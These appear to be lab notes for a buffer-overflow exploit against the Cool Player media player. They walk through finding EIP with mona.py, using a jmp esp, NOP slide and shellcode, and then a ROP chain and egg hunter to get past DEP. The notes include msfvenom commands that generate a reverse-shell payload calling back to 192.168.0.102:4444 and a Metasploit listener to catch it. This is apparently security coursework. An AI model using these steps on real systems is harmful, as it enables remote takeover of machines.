# How To

No Dep

   1) Add *mona.py* to ```C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands```
   2) Basic
      1) Windows
         1) Navigate to ```C:\cmd``` in cmd line
         2) Run ```pattern_create 3000 > "C:\Documents and Settings\Administrator\Desktop\pattern.txt"```
            * This creates a pattern that can be used to calculate the dist to eip
         3) Add the string to *pattern.pl*
         4) Run ```perl pattern.pl```
         5) Load Immunity Debugger
         6) Add *Cool Player* to Immunity Debugger
         7) Attach *pattern.ini* to *Cool Player*
         8) In Immunity Debugger run ```!mona findmsp```
            * Location of EIP
              * image showing the info
            * Size of space for the shellcode
               * Thes hellcode + padding should be less than this
         9) In Immunity Debugger run ```!mona jmp -r esp```
            * find ESP
              * WHY??
         10) Select a jmp esp that does not contain null bytes
             1) Put all the code together into *proofofConcept.pl*
                1) Usable bytes
                2) Distance to EIP
                3) Nop slide
                   * prevents overwriting of shellcode
                4) Shellcode
                   * this is the payload
                   * used calc.exe shellcode (came with the vm)
         11) Reset Immunity Debugger
         12) Run ```perl proofofConcept.pl```
         13) Attach *proofofConcept.ini* to *Cool Player*

   3) Advanced
      1) Kali
         1) Run ```ip a```
            * confirm lhost ip address
         2) run ```msfvenom -a x86 --platform Windows -p windows/shell_reverse__tcp LHOST=192.168.0.102 LPORT=4444 -e x86/alpha_upper -b '\x00' -f perl >shell.pl```
            * ```-a``` - architecture
            * ```--platform``` - platform for the shellcode
            * ```-p``` - payload
            * ```LHOST``` & ```LPORT``` - listening ip address and port
            * ```-e``` - encoding
            * ```-b``` - characters to avoid
            * ```-f``` - format
         3) ```msfconsole```
         4) ```use multi/handler```
            1) ```show options```
               1) ```set payload windows/shell_reverse_tcp```
               2) ```set lhost 192.168.0.102```
               3) ```set lport 4444```
      2) Windows
         1) Optional
            1) Load Immunity Debugger
            2) Add *Cool Player* to Immunity Debugger
         2) Add shellcode to *shell.pl*
            1) confirm variable names
         3) Run ```perl shell.pl```
         4) Attach *shell.ini* to *Cool Player*
         5) Run ```ipconfig``` in the cmd line
            * use to prove exploitation
      3) Kali
         1) ```show options```
         2) ```exploit```
         3) view listener
            1) ```ipconfig```

DEP On

   1) Basic
      1) Windows
         1) Enable Dep
            1) Load Immunity Debugger
            2) Add *Cool Player* to Immunity Debugger
            3) Run *Cool Player*
         2) Generating the Chain
            1) In Immunity Debugger run ```!mona rop -m msvcrt.dll -cpb '\x00\x0a\x0d'```
               1) This generates the rop chain
            2) In Immunity Debugger run ```!mona find -type instr -s "retn" -m msvcrt.dll -cp '\x00\x0a' -x x```
               1) this shows the jmp points
         3) Generating the Egg Hunter
            1) ```!mona egg -t w00t```
               1) copy the code from the file
         4) Run ```perl ropCalc.pl```
   2) Advanced
      1) Kali
         1) run ```msfvenom -a x86 --platform Windows -p windows/shell_reverse__tcp LHOST=192.168.0.102 LPORT=4444 -e x86/alpha_upper -b '\x00' -f perl >shell.pl```
            * ```-a``` - architecture
            * ```--platform``` - platform for the shellcode
            * ```-p``` - payload
            * ```LHOST``` & ```LPORT``` - listening ip address and port
            * ```-e``` - encoding
            * ```-b``` - characters to avoid
            * ```-f``` - format
         2) ```msfconsole```
         3) ```use multi/handler```
            1) ```show options```
               1) ```set payload windows/shell_reverse_tcp```
               2) ```set lhost 192.168.0.102```
               3) ```set lport 4444```
      2) Windows
         1) Enable Dep
         2) Load Immunity Debugger
         3) Add *Cool Player* to Immunity Debugger
         4) Run *Cool Player*
         5) Add shellcode to *shell.pl*
         6) Run ```perl shell.pl```
         7) Attach *shell.ini* to *Cool Player*
      3) Kali
         1) ```exploit```
         2) view listener
            1) exploit